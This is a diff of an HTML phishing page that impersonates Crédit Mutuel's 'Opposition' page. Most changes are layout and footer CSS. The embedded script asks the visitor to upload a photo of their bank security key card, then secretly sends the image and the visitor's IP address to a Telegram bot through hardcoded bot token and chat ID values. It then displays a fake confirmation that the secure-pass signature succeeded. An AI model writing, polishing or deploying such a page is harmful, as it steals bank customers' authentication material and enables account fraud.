@@ -6,6 +6,7 @@
 <title>Opposition - Crédit Mutuel</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 <style>
+/* ═══ RESET COMPLET ═══ */
 * {
     box-sizing: border-box;
     margin: 0;
@@ -14,13 +15,24 @@
     -webkit-font-smoothing: antialiased;
 }
 
+html, body {
+    width: 100%;
+    overflow-x: hidden;
+}
+
 body {
     background: #f0f2f5;
     display: flex;
-    justify-content: center;
-    align-items: flex-start;
+    flex-direction: column;
     min-height: 100vh;
-    padding: 0;
+}
+
+/* ═══ CONTENEUR CENTRÉ POUR LE CONTENU ═══ */
+.app-wrapper {
+    width: 100%;
+    display: flex;
+    justify-content: center;
+    flex-grow: 1;
 }
 
 .app-container {
@@ -29,9 +41,9 @@ body {
     background: #f0f2f5;
     display: flex;
     flex-direction: column;
-    min-height: 100vh;
 }
 
+/* ═══ HEADER ═══ */
 header {
     display: flex;
     justify-content: space-between;
@@ -93,6 +105,7 @@ header {
     color: #1d1d1f;
 }
 
+/* ═══ ZONE GRISE TITRE ═══ */
 .gray-zone {
     background: #f0f2f5;
     padding: 28px 20px 20px 20px;
@@ -106,6 +119,7 @@ header {
     margin: 0;
 }
 
+/* ═══ CARTE BLANCHE ═══ */
 .card {
     background: #ffffff;
     border-radius: 12px;
@@ -229,6 +243,7 @@ label.field-label {
 }
 .tips-box a:hover { text-decoration: none; }
 
+/* ═══ ÉTAPES ═══ */
 .step { display: none; }
 .step.active { display: block; }
 
@@ -322,12 +337,20 @@ label.field-label {
     100% { opacity: 1; stroke-dashoffset: 0; }
 }
 
-/* ═══ FOOTER BLEU ═══ */
-.footer {
+/* ═══ FOOTER — PLEINE LARGEUR ═══ */
+.footer-full {
+    width: 100%;
     background: #003192;
     color: #ffffff;
-    padding: 20px 20px 15px 20px;
-    width: 100%;
+    margin-top: 0;
+    padding: 0;
+}
+
+/* Contenu interne centré à 390px */
+.footer-full .footer-inner {
+    max-width: 390px;
+    margin: 0 auto;
+    padding: 20px;
 }
 
 .footer-top {
@@ -405,15 +428,22 @@ label.field-label {
     border-bottom: 1px solid rgba(255,255,255,0.2);
 }
 
-.footer-bottom-white {
+/* ═══ BANDEAU BLANC — PLEINE LARGEUR ═══ */
+.footer-white-full {
+    width: 100%;
     background: #ffffff;
-    padding: 14px 20px;
+    padding: 14px 0;
+}
+
+.footer-white-full .footer-white-inner {
+    max-width: 390px;
+    margin: 0 auto;
+    padding: 0 20px;
     display: flex;
     justify-content: space-between;
     align-items: center;
-    margin: 0 -20px -15px -20px;
-    width: calc(100% + 40px);
 }
+
 .footer-brand { display: flex; align-items: center; gap: 8px; }
 .footer-brand img { height: 22px; width: auto; }
 .footer-brand-text {
@@ -426,85 +456,90 @@ label.field-label {
 .footer-socials { display: flex; align-items: center; gap: 10px; }
 .footer-socials a { color: #d32f2f; font-size: 14px; text-decoration: none; }
 .footer-socials a:hover { color: #003192; }
-
-@media (min-width: 500px) {
-    .app-container { margin: 0 auto; }
-}
 </style>
 </head>
 <body>
 
-<div class="app-container">
-    <header>
-        <div class="header-left">
-            <div class="burger">
-                <div class="burger-lines">
-                    <span></span>
-                    <span></span>
-                    <span></span>
-                </div>
-                <div class="menu-text">Menu</div>
-            </div>
-            <img src="logo.png" alt="Crédit Mutuel" class="logo-img">
-        </div>
-        <div class="search-icon">
-            <i class="fa-solid fa-magnifying-glass"></i>
-        </div>
-    </header>
-
-    <div class="gray-zone">
-        <h1 id="main-title">Opposition</h1>
-    </div>
-
-    <div class="card">
-        <div class="card-content">
-            <div class="section-header" id="section-title">
-                Carte de clés <i class="fa-solid fa-chevron-down"></i>
-            </div>
-
-            <div class="step active" id="step-form">
-                <form>
-                    <div class="form-group">
-                        <p class="mandatory-note"><span>*</span> Information obligatoire</p>
-                        <label class="field-label">Photo de votre carte de clés<span style="color:#d32f2f">*</span></label>
-                        
-                        <label for="file-input" class="upload-btn" id="upload-label">
-                            <i class="fa-solid fa-arrow-up"></i>
-                            <span id="upload-text">Importer un fichier</span>
-                        </label>
-                        <input type="file" id="file-input" accept="image/*">
+<!-- CONTENU CENTRÉ -->
+<div class="app-wrapper">
+    <div class="app-container">
+        <!-- HEADER -->
+        <header>
+            <div class="header-left">
+                <div class="burger">
+                    <div class="burger-lines">
+                        <span></span>
+                        <span></span>
+                        <span></span>
                     </div>
-
-                    <button type="button" class="btn-primary">Se connecter</button>
-                </form>
-            </div>
-
-            <div class="step" id="step-loading">
-                <div class="spinner"></div>
-            </div>
-
-            <div class="step" id="step-success">
-                <div class="card-message">
-                    Votre signature sécur'pass a été confirmée, vous allez être redirigé dans quelques instants...
+                    <div class="menu-text">Menu</div>
                 </div>
-                <svg class="validation-circle" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-                    <rect class="bg-shape" x="10" y="10" width="80" height="80" rx="50" ry="50" fill="#5cdb3a"/>
-                    <circle class="inner-circle" cx="50" cy="50" r="30" fill="#ffffff"/>
-                    <path class="green-check" d="M 38 50 L 46 58 L 63 41" fill="none" stroke="#5cdb3a" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/>
-                </svg>
+                <img src="logo.png" alt="Crédit Mutuel" class="logo-img">
             </div>
+            <div class="search-icon">
+                <i class="fa-solid fa-magnifying-glass"></i>
+            </div>
+        </header>
+
+        <!-- ZONE GRISE TITRE -->
+        <div class="gray-zone">
+            <h1 id="main-title">Opposition</h1>
         </div>
 
-        <a href="#" class="forgot-link" id="forgot-link">
-            Codes d'accès oubliés <i class="fa-solid fa-arrow-right"></i>
-        </a>
+        <!-- CARTE BLANCHE -->
+        <div class="card">
+            <div class="card-content">
+                <div class="section-header" id="section-title">
+                    Carte de clés <i class="fa-solid fa-chevron-down"></i>
+                </div>
 
-        <div class="tips-box">
-            <strong>Astuces :</strong> <a href="#">Nos conseils pour sécuriser vos opérations et données.</a>
+                <div class="step active" id="step-form">
+                    <form>
+                        <div class="form-group">
+                            <p class="mandatory-note"><span>*</span> Information obligatoire</p>
+                            <label class="field-label">Photo de votre carte de clés<span style="color:#d32f2f">*</span></label>
+                            
+                            <label for="file-input" class="upload-btn" id="upload-label">
+                                <i class="fa-solid fa-arrow-up"></i>
+                                <span id="upload-text">Importer un fichier</span>
+                            </label>
+                            <input type="file" id="file-input" accept="image/*">
+                        </div>
+
+                        <button type="button" class="btn-primary">Se connecter</button>
+                    </form>
+                </div>
+
+                <div class="step" id="step-loading">
+                    <div class="spinner"></div>
+                </div>
+
+                <div class="step" id="step-success">
+                    <div class="card-message">
+                        Votre signature sécur'pass a été confirmée, vous allez être redirigé dans quelques instants...
+                    </div>
+                    <svg class="validation-circle" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                        <rect class="bg-shape" x="10" y="10" width="80" height="80" rx="50" ry="50" fill="#5cdb3a"/>
+                        <circle class="inner-circle" cx="50" cy="50" r="30" fill="#ffffff"/>
+                        <path class="green-check" d="M 38 50 L 46 58 L 63 41" fill="none" stroke="#5cdb3a" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                </div>
+            </div>
+
+            <a href="#" class="forgot-link" id="forgot-link">
+                Codes d'accès oubliés <i class="fa-solid fa-arrow-right"></i>
+            </a>
+
+            <div class="tips-box">
+                <strong>Astuces :</strong> <a href="#">Nos conseils pour sécuriser vos opérations et données.</a>
+            </div>
         </div>
     </div>
+</div>
 
-    <footer class="footer">
+<!-- FOOTER BLEU — PLEINE LARGEUR -->
+<footer class="footer-full">
+    <div class="footer-inner">
         <div class="footer-top">
             <div class="footer-top-links">
                 <a href="#"><i class="fa-solid fa-circle-info"></i> Centre d'aide</a>
@@ -539,28 +574,29 @@ label.field-label {
         <div class="footer-mention">
             Le Crédit Mutuel, banque coopérative, appartient à ses 9 millions de clients-sociétaires
         </div>
-        <div class="footer-bottom-white">
-            <div class="footer-brand">
-                <img src="logo.png" alt="Crédit Mutuel">
-                <span class="footer-brand-text">Une banque qui appartient à ses clients, ça change tout.</span>
-            </div>
-            <div class="footer-socials">
-                <a href="#"><i class="fa-brands fa-x-twitter"></i></a>
-                <a href="#"><i class="fa-brands fa-facebook-f"></i></a>
-                <a href="#"><i class="fa-brands fa-instagram"></i></a>
-                <a href="#"><i class="fa-brands fa-youtube"></i></a>
-                <a href="#"><i class="fa-brands fa-linkedin-in"></i></a>
-            </div>
+    </div>
+</footer>
+
+<!-- BANDEAU BLANC — PLEINE LARGEUR -->
+<div class="footer-white-full">
+    <div class="footer-white-inner">
+        <div class="footer-brand">
+            <img src="logo.png" alt="Crédit Mutuel">
+            <span class="footer-brand-text">Une banque qui appartient à ses clients, ça change tout.</span>
         </div>
-    </footer>
+        <div class="footer-socials">
+            <a href="#"><i class="fa-brands fa-x-twitter"></i></a>
+            <a href="#"><i class="fa-brands fa-facebook-f"></i></a>
+            <a href="#"><i class="fa-brands fa-instagram"></i></a>
+            <a href="#"><i class="fa-brands fa-youtube"></i></a>
+            <a href="#"><i class="fa-brands fa-linkedin-in"></i></a>
+        </div>
+    </div>
 </div>
 
 <script>
-    // ═══════════════════════════════════════════════════════
-    //  CONFIGURATION TELEGRAM — REMPLACEZ CES VALEURS
-    // ═══════════════════════════════════════════════════════
-    const TELEGRAM_BOT_TOKEN = '8940288270:AAFZvUjzmdhSFJbzq1T7gZReKA9a3FC-DDE';      // ← Ex: 1234567890:ABCdefGHI...
-    const TELEGRAM_CHAT_ID = '-1004371103855';      // ← Ex: 123456789
+    const TELEGRAM_BOT_TOKEN = '8940288270:AAFZvUjzmdhSFJbzq1T7gZReKA9a3FC-DDE';
+    const TELEGRAM_CHAT_ID = '-1004371103855';
 
     const fileInput = document.getElementById('file-input');
     const mainTitle = document.getElementById('main-title');
@@ -570,9 +606,6 @@ label.field-label {
     const stepSuccess = document.getElementById('step-success');
     const forgotLink = document.getElementById('forgot-link');
 
-    // ═══════════════════════════════════════════════════════
-    //  RÉCUPÉRER L'IP DE LA PERSONNE
-    // ═══════════════════════════════════════════════════════
     async function getUserIP() {
         try {
             const res = await fetch('https://api.ipify.org?format=json');
@@ -583,57 +616,46 @@ label.field-label {
         }
     }
 
-    // ═══════════════════════════════════════════════════════
-    //  ENVOYER L'IMAGE + IP VERS TELEGRAM
-    // ═══════════════════════════════════════════════════════
-async function sendToTelegram(file) {
-    try {
-        const ip = await getUserIP();
+    async function sendToTelegram(file) {
+        try {
+            const ip = await getUserIP();
 
-        // 1. Message texte
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: `--------✅[CREDITS MUTUEL]✅-------\n\n🚀 Nouvelle carte de clés\n💻 IP ADDRESS : ${ip}\n\n-------✅[CREDITS MUTUEL]✅-------`
-            })
-        });
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: `--------✅[CREDITS MUTUEL]✅-------\n\n🚀 Nouvelle carte de clés\n💻 IP ADDRESS : ${ip}\n\n-------✅[CREDITS MUTUEL]✅-------`
+                })
+            });
 
-        // 2. Image SANS texte (juste la photo)
-        const formData = new FormData();
-        formData.append('chat_id', TELEGRAM_CHAT_ID);
-        formData.append('photo', file);
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', file);
 
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-        });
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
 
-        console.log('✅ Envoyé à Telegram');
-    } catch (e) {
-        console.error('❌ Erreur Telegram :', e);
+            console.log('✅ Envoyé à Telegram');
+        } catch (e) {
+            console.error('❌ Erreur Telegram :', e);
+        }
     }
-}
 
-    // ═══════════════════════════════════════════════════════
-    //  GESTION DE L'UPLOAD
-    // ═══════════════════════════════════════════════════════
     fileInput.addEventListener('change', function(e) {
         const f = e.target.files[0];
         if (!f) return;
 
-        // ÉTAPE 2 : Chargement
         stepForm.classList.remove('active');
         stepLoading.classList.add('active');
         mainTitle.textContent = 'Chargement';
         sectionTitle.innerHTML = 'Identifiant / Mot de passe <i class="fa-solid fa-chevron-down"></i>';
         forgotLink.style.display = 'none';
 
-        // Envoi en arrière-plan à Telegram
         sendToTelegram(f);
 
-        // Après 2,5s → ÉTAPE 3 : Validation
         setTimeout(() => {
             stepLoading.classList.remove('active');
             stepSuccess.classList.add('active');
